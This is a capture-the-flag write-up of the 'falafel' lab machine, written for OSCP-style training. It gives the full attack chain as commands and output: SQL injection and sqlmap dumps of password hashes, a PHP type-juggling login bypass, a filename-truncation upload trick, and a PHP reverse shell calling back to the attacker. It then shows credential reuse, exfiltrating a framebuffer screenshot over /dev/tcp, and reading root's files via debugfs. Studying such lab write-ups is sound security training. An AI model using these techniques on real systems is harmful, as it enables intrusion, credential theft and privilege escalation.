---
layout: post
title: "falafel"
date: 2025-09-16 
categories: OSCP Playlist
---
# falafel

# Summary

- ffuf to fuzz for .txt file, find clue about weakness
- login form vulnerable to SQLi
- sqlmap with —string parameter to speed up detection
- db leaks user pw
- php type juggling vulnerability to bypass admin login
- max file name size to try overflow name buffer on web, find out max allowed size
- use pattern_create.rb to generate junk bytes as payload, bypass file upload restriction manipulating file name length
- upload reverse shell
- pw reuse in connection.php
- we are in video group, yossi user also logged on locally, allow us to take screenshot with cat /dev/fb0 > screenshot
- gimp to view screenshot, need to adjust resolution with cat /sys/class/graphics/fb0/virtual_size
- yossi in /disk group so we can read whole disk, including /root file
- read root.txt with debugfs or root’s id_rsa

# Attack Path

First enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oN nmap/falafel 10.10.10.73

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 36:c0:0a:26:43:f8:ce:a8:2c:0d:19:21:10:a6:a8:e7 (RSA)
|   256 cb:20:fd:ff:a8:80:f2:a2:4b:2b:bb:e1:76:98:d0:fb (ECDSA)
|_  256 c4:79:2b:b6:a9:b7:17:4c:07:40:f3:e5:7c:1a:e9:dd (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/*.txt
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Falafel Lovers
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Let’s visit the web page. 

![image.png]({{ site.baseurl }}/assets/falafel/image.png)

We see a domain name. Let’s add that to our /etc/hosts file:

```bash
10.10.10.73 falafel.htb
```

![image.png]({{ site.baseurl }}/assets/falafel/image%201.png)

Let’s attempt to login with default credential admin:admin:

![image.png]({{ site.baseurl }}/assets/falafel/image%202.png)

We get a failed. Let’s fuzz the page:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://10.10.10.73/FUZZ -ic

images                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 26ms]
uploads                 [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 18ms]
assets                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 16ms]
css                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 16ms]
js                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 20ms]
                        [Status: 200, Size: 7203, Words: 774, Lines: 110, Duration: 24ms]
server-status           [Status: 403, Size: 299, Words: 22, Lines: 12, Duration: 24ms]
```

We try visiting uploads but we get a 403 Forbidden. Changing the HTTP request header also did not work. Let’s also fuzz for php files:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://10.10.10.73/FUZZ -ic -e .php

images                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 17ms]
.php                    [Status: 403, Size: 290, Words: 22, Lines: 12, Duration: 17ms]
index.php               [Status: 200, Size: 7203, Words: 774, Lines: 110, Duration: 24ms]
                        [Status: 200, Size: 7203, Words: 774, Lines: 110, Duration: 24ms]
login.php               [Status: 200, Size: 7063, Words: 878, Lines: 103, Duration: 34ms]
profile.php             [Status: 302, Size: 9787, Words: 1292, Lines: 259, Duration: 26ms]
uploads                 [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 22ms]
header.php              [Status: 200, Size: 288, Words: 10, Lines: 18, Duration: 16ms]
assets                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 22ms]
footer.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 21ms]
upload.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 27ms]
css                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 15ms]
style.php               [Status: 200, Size: 6174, Words: 690, Lines: 69, Duration: 13ms]
js                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 12ms]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 20ms]
connection.php          [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 15ms]
.php                    [Status: 403, Size: 290, Words: 22, Lines: 12, Duration: 14ms]
                        [Status: 200, Size: 7203, Words: 774, Lines: 110, Duration: 16ms]
server-status           [Status: 403, Size: 299, Words: 22, Lines: 12, Duration: 17ms]

```

Nothing grants us further access. Let’s also fuzz for .txt files:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://10.10.10.73/FUZZ -ic -e .txt

robots.txt              [Status: 200, Size: 30, Words: 3, Lines: 2, Duration: 18ms]
cyberlaw.txt            [Status: 200, Size: 804, Words: 106, Lines: 18, Duration: 21ms]

```

cyberlaw.txt:

```bash
From: Falafel Network Admin (admin@falafel.htb)
Subject: URGENT!! MALICIOUS SITE TAKE OVER!
Date: November 25, 2017 3:30:58 PM PDT
To: lawyers@falafel.htb, devs@falafel.htb
Delivery-Date: Tue, 25 Nov 2017 15:31:01 -0700
Mime-Version: 1.0
X-Spam-Status: score=3.7 tests=DNS_FROM_RFC_POST, HTML_00_10, HTML_MESSAGE, HTML_SHORT_LENGTH version=3.1.7
X-Spam-Level: ***

A user named "chris" has informed me that he could log into MY account without knowing the password,
then take FULL CONTROL of the website using the image upload feature.
We got a cyber protection on the login form, and a senior php developer worked on filtering the URL of the upload,
so I have no idea how he did it.

Dear lawyers, please handle him. I believe Cyberlaw is on our side.
Dear develpors, fix this broken site ASAP.

	~admin
```

robots.txt:

![image.png]({{ site.baseurl }}/assets/falafel/image%203.png)

When we attempt to put a SQLinjection, we also get the error Wrong Identification: admin

```bash
' OR '1'='1'-- -
```

![image.png]({{ site.baseurl }}/assets/falafel/image%204.png)

When we attempt to use another SQL injection to get the database name, we get this error:

```bash
' UNION SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata-- -

```

![image.png]({{ site.baseurl }}/assets/falafel/image%205.png)

```bash
sqlmap -r req.txt --level 5 --risk 3 --batch --tamper=between,randomcase --random-agent
```

Mark username with astericks.

![image.png]({{ site.baseurl }}/assets/falafel/image%206.png)

The username field appear to be vulnerable to time-based blind queries

Let’s enumerate the db. It takes forever to enumerate, let’s let sqlmap find another technique. Since we have the string for an admin failed condition, let’s:

```bash
sqlmap -r req.txt --level 5 --risk 3 --batch --string "Wrong identification" -p username --technique=B
```

![image.png]({{ site.baseurl }}/assets/falafel/image%207.png)

`--string` speeds things up when you can provide a stable, unambiguous text marker that changes predictably with the injected boolean condition — it turns sqlmap’s detection into a simple, fast substring test.
Now let’s enumerate the db:

```bash
sqlmap -r req.txt --level 5 --risk 3 --batch --string "Wrong identification" -p username --technique=B --dbs

available databases [2]:
[*] falafel
[*] information_schema

sqlmap -r req.txt --level 5 --risk 3 --batch --string "Wrong identification" -p username --technique=B -D falafel --tables

+-------+
| users |
+-------+

sqlmap -r req.txt --level 5 --risk 3 --batch --string "Wrong identification" -p username --technique=B -D falafel -T users --dump

+----+--------+---------------------------------------------+----------+
| ID | role   | password                                    | username |
+----+--------+---------------------------------------------+----------+
| 1  | admin  | 0e462096931906507119562988736854            | admin    |
| 2  | normal | d4ee02a22fc872e36d9e3751ba72ddc8 (juggling) | chris    |
+----+--------+---------------------------------------------+----------+

```

Let’s also check our privileges on mysql:

```bash
sqlmap -r req.txt --level 5 --risk 3 --batch --string "Wrong identification" -p username --technique=B --privileges

[16:12:13] [INFO] retrieved: 'moshe'@'localhost'
[16:12:18] [INFO] fetching number of privileges for user 'moshe'
[16:12:18] [INFO] retrieved: 1
[16:12:18] [INFO] fetching privileges for user 'moshe'
[16:12:18] [INFO] retrieved: USAGE
database management system users privileges:

[*] %moshe% [1]:
    privilege: USAGE

```

This mean we do not have any other privileges other than reading the database.

We have chris’s cracked hash. Let’s login as chris:

```bash
chris:juggling
```

![image.png]({{ site.baseurl }}/assets/falafel/image%208.png)

The passage here is alluding to type juggling done by php.

In PHP, the `==` operator (loose comparison) does **type juggling**:

- If one side is a number and the other is a string, PHP will try to convert the string into a number before comparing.
- If both look like numbers in scientific notation (e.g., `0e12345`), PHP interprets them as floats.

This can cause **logic flaws in authentication or hash checks**.

Since the password for admin being with 0e, which is the mathematical notation for exponential. If php is using the `==` operator, we just have to find another string, that when converted into MD5 hash outputs 0e something. 

So let’s try:

```bash
QLTHNDT

echo -n 'QLTHNDT' | md5sum
0e405967825401955372549139051580  -
```

![image.png]({{ site.baseurl }}/assets/falafel/image%209.png)

Success. We have a file upload page where we can upload image files. Navigating to the profile, we find: 

![image.png]({{ site.baseurl }}/assets/falafel/image%2010.png)

This is a hint to the maximum file size name of linux. 

![image.png]({{ site.baseurl }}/assets/falafel/image%2011.png)

We can use metasploit to create 255 bytes of junk:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
```

Now copy and paste the characters, minus 4 chars to add the extension:

```bash
touch Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai.png
```

Now let’s try to upload:

```bash
http://10.10.16.7:8001/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai.png
```

It was successfully uploaded. We also see that the web server shortened our file name. If we inspect the elements:

![image.png]({{ site.baseurl }}/assets/falafel/image%2012.png)

Our new name:

```bash
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah
```

Now that we know the limit of the file name, let’s upload our php exploit, by first subtracting the 4 chars to add our .php extension, then add a .png extension after that; the website will cut off  the extra .png extension, leaving us with a executable php script. 

```bash
mv Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai.png Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6A.php.png
```

Let’s get a reverse shell.

```bash
<?php
$sock=fsockopen("10.10.16.7",4444);
$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>

```

Now upload:

```bash
http://10.10.16.7:8001/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6A.php.png
```

Now let’s visit:

```bash
http://10.10.10.73/uploads/0916-1911_cdaab779e321803d/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6A.php
```

We now have shell:

![image.png]({{ site.baseurl }}/assets/falafel/image%2013.png)

Checking connection.php:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

```

```bash
<?php
   define('DB_SERVER', 'localhost:3306');
   define('DB_USERNAME', 'moshe');
   define('DB_PASSWORD', 'falafelIsReallyTasty');
   define('DB_DATABASE', 'falafel');
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
   // Check connection
   if (mysqli_connect_errno())
   {
      echo "Failed to connect to MySQL: " . mysqli_connect_error();
   }
?>

```

Then checking /home:

```bash
ls /home

moshe  yossi
```

Let’s see if the password was reused:

```bash
ssh moshe@10.10.10.73
```

We are in:

![image.png]({{ site.baseurl }}/assets/falafel/image%2014.png)

Let’s enumerate through our rights:

```bash
id 

uid=1001(moshe) gid=1001(moshe) groups=1001(moshe),4(adm),8(mail),9(news),22(voice),25(floppy),29(audio),44(video),60(games)

sudo -l

Sorry, user moshe may not run sudo on falafel.htb.

```

We are part of the adm group, which can read logs. 

Let’s check network information:

```bash
moshe@falafel:~$ ss -lntp
State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port    
LISTEN   0         80                127.0.0.1:3306             0.0.0.0:*       
LISTEN   0         128                 0.0.0.0:80               0.0.0.0:*       
LISTEN   0         128           127.0.0.53%lo:53               0.0.0.0:*       
LISTEN   0         128                 0.0.0.0:22               0.0.0.0:*       
LISTEN   0         128                    [::]:22                  [::]:*       
moshe@falafel:~$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.73  netmask 255.255.254.0  broadcast 10.10.11.255
        ether 00:50:56:94:9c:fe  txqueuelen 1000  (Ethernet)
        RX packets 1400630  bytes 235963862 (235.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1361806  bytes 656993013 (656.9 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 406786  bytes 36149444 (36.1 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 406786  bytes 36149444 (36.1 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

Let’s transfer linpeas and execute it.

```bash
wget http://10.10.16.7:8001/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Interesting outputs:

```bash
╔══════════╣ Login now
 19:21:54 up  3:11,  2 users,  load average: 0.55, 0.15, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1     -                16:11    3:11m  0.03s  0.03s -bash
moshe    pts/1    10.10.16.7       19:14   42.00s  0.05s  0.05s python3 -c import pty; pty.spawn("/bin/bash")
```

yossi is also logged on right now. tty1 mean he is physically on the machine. Since we are part of the video group, we can attempt to read the monitor of yossi. 

We can look in /dev/ and files relating to fb is to do with the user’s screen:

```bash
ls /dev | grep fb

fb0
```

Now let’s send the file over to our attack host. Before we do that, we also need to find the resolution size yossi’s monitor, otherwise there will be some errors.

```bash
#on attack box
nc -lnvp 9001 > fb.raw

#on target
cat /sys/class/graphics/fb0/virtual_size

1176,885

cat /dev/fb0 > /dev/tcp/10.10.16.7/9001
```

Now let’s use gimp to open the file:

```bash
sudo apt install gimp 
```

Click on show all files, then choose the file type as raw image data:

![image.png]({{ site.baseurl }}/assets/falafel/image%2015.png)

Once opened, let’s change our resolution to the one matching on the target. And change the pxiel format as well.

![image.png]({{ site.baseurl }}/assets/falafel/image%2016.png)

![image.png]({{ site.baseurl }}/assets/falafel/image%2017.png)

```bash
yossi:MoshePlzStopHackingMe!
```

Let’s try switching to that user:

```bash
su yossi
```

We are in.

![image.png]({{ site.baseurl }}/assets/falafel/image%2018.png)

Let’s check this user’s privilege:

```bash
id

uid=1000(yossi) gid=1000(yossi) groups=1000(yossi),4(adm),6(disk),24(cdrom),30(dip),46(plugdev),117(lpadmin),118(sambashare)

```

We are part of the disk group, which has full access to partitions mounted in /dev. We can use debugfs to read the disk:

```bash
debugfs /dev/sda1

cat /root/root.txt
```

We can also read root’s ssh private key:

```bash
cat /root/.ssh/id_rsa
```